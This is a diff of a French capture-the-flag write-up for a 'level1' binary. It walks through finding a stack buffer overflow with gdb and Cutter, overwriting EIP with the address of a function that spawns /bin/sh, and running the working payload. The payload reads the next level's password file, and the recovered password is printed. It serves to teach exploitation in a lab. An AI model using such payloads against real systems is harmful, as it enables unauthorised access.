@@ -1,8 +1,8 @@
 # Level1
 
-On observe un executable a la racine `level1`
+On observe un exécutable à la racine : `level1`
 
-```bash
+```shell
 $ ./level1
 Hello World
 
@@ -10,9 +10,9 @@ $ python -c 'print "A"*100' | ./level1
 Segmentation fault (core dumped)
 ```
 
-On cherche donc a comprendre ce que fait l'executable
+On cherche donc à comprendre ce que fait l'exécutable
 
-```bash
+```shell
 $ gdb level1 -q
 Reading symbols from /home/user/level1/level1...(no debugging symbols found)...done.
 (gdb) set disassembly-flavor intel
@@ -30,19 +30,19 @@ Dump of assembler code for function main:
 End of assembler dump.
 ```
 
-On va utiliser `Cutter` pour avoir un idee plus clair de `level1`
+On va utiliser `Cutter` pour avoir une idée plus claire de `level1`
 
-```bash
+```shell
 $ scp -P 4242 -r level1@192.168.56.102:/home/user/level1/level1 .
 
 $ ./Cutter-v2.1.2-Linux-x86_64.AppImage level1
 ```
 
-_resultat sauvegarde dans [source.md](source.md)_
+_resultat sauvegardé dans [source.md](source.md)_
 
-On peut remarquer que `undefined auStack80 [76]`, on peut essayer de remplir la place qu'y nous etes aloue
+On remarque que `undefined auStack80 [76]` représente un buffer qui nous est alloué, on peut essayer de le remplir :
 
-```bash
+```shell
 $ python -c 'print "A"*75' | ./level1
 
 $ python -c 'print "A"*76' | ./level1
@@ -55,13 +55,13 @@ $ python -c 'print "A"*78' | ./level1
 Segmentation fault (core dumped)
 ```
 
-- `python -c 'print "A"*75'` est notre taille aloue maximum (75 + 1 = 76 pour le `\n` automatique du print de python)
+- `python -c 'print "A"*75'` est notre taille aloue maximum (75 + 1 = 76 caractères pour le `\n` automatique du print de python)
 
-- `76` a `79'`, on ecrit pardessus EBP sauvegarde
+- De `77` à `80'`, on écrit par dessus l'EBP, de `81` à `84`, par dessus l'EIP
 
-On remarque aussi, grace a `Cutter` qu'il y a une fonction `run` bien pratique colle a main qui fait un appel a `/bin/sh`
+On remarque aussi, grace a `Cutter` qu'il y a une fonction `run` qui fait un appel a `/bin/sh`
 
-```bash
+```shell
 run ();
 0x08048444      push    ebp
 0x08048445      mov     ebp, esp
@@ -92,9 +92,9 @@ int main (int argc, char **argv, char **envp);
 0x08048497      nop
 ```
 
-On a une porte d'entre, plus une clef. Plus qu'a rassembler tout ca en meme temps
+On a une porte d'entré, plus une clef. Plus qu'à les rassembler en remplaçant l'EIP (prochaine instruction) par l'addresse de `run`:
 
-```bash
+```shell
 $ python -c 'print "A"*76 + "\x44\x84\x04\x08"' | ./level1
 Good... Wait what?
 Segmentation fault (core dumped)
@@ -104,20 +104,15 @@ _Hmm..._
 
 Le programme se ferme avant que l'on ai le temps de faire quoi que ce soit.
 
-Mais grace a `cat`, nous avons un moyen de retarder la fermeture de `level1`
+Mais grace a `cat`, nous avons un moyen d'empêcher la fermeture de `level1`
 
-```bash
+```shell
 $ (python -c 'print "A"*76 + "\x44\x84\x04\x08"'; cat) | ./level1
 Good... Wait what?
 cat /home/user/level2/.pass
 53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77
 Ctrl+D
 Segmentation fault (core dumped)
-
-level1:$ su level2
-Password:
-
-level2:$
 ```
 
 `https://beta.hackndo.com/buffer-overflow/`
